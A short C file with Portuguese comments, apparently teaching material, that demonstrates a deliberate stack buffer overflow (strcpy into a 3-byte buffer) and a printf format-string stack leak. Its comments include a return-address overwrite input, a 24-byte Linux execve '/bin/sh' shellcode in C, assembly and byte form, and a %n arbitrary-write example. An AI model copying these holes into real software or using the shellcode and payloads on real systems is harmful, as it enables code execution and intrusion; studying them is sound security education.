
// copia uma string em outra (origem para destino).
// Retorna destino.

// #include<string.h> // = = = = = = = = = = = = = = = = = = = = = = = =
extern char *strcpy(char *destino, char *origem)

// #include<stdio.h> // = = = = = = = = = = = = = = = = = = = = = = = =
extern int printf(char *, ...);

void bo1(char *FILENAME)
{
   char buff[3];
   strcpy(buff, FILENAME);
   printf("Teste:\n%s\n",buff);
}

int main()
{
   printf("%s\n", "Viewing the stack:");
   printf("%x\n%x\n%x\n%x\n%x\n%x\n");

   bo1("Isso é um teste");
   printf("Terminei.\n");
   return(0);
}

/*
Exploid:
If the FILENAME is longer than 3 bytes, the strcpy function will write past the end of the buf[] array.
É possível executar um código arbitrário usando buff e até ganhar o shell. (Analise a pilha feita pelo programa para chamar a função.)
*/

/*
bo1("aaaaaaabbbb\x78\x56\x34\x12");
Return address is overwritten with 0x12345678
*/


/*
         Linux Shellcode in 24 bytes
shellcode.c
char* argv[] = {
    "/bin/sh",
    NULL
}
execve(argv[0], argv, NULL);


shellcode.asm
xor eax, eax  ; eax = 0
; filename
push eax      ; push 0
push '//sh'
push '/bin'
mov ebx, esp  ; ebx = "/bin/sh"
push eax      ; push 0
push ebx      ; push "/bin/sh"
mov ecx, esp  ; ecx = argv
cdq           ; edx = 0
mov al, 0x0b  ; eax = 0x0b
int 0x80


shellcode as a C string
char shellcode[] =
  "\x31\xc0\x50\x68//sh"
  "\x68/bin\x89\xe3\x50"
  "\x53\x89\xe1\x99\xb0"
  "\x0b\xcd\x80";


  Overwriting arbitrary memory location:
  printf("\x78\x56\x34\x12 %x%x%x%x %n");

  The first four bytes are the address to overwrite.
  The %x formats pop arguments off the stack until we reach the format string.
  The %n format writes the number of characters we've output so far to a location indicated by the next argument, which happens to be 0x12345678.

*/


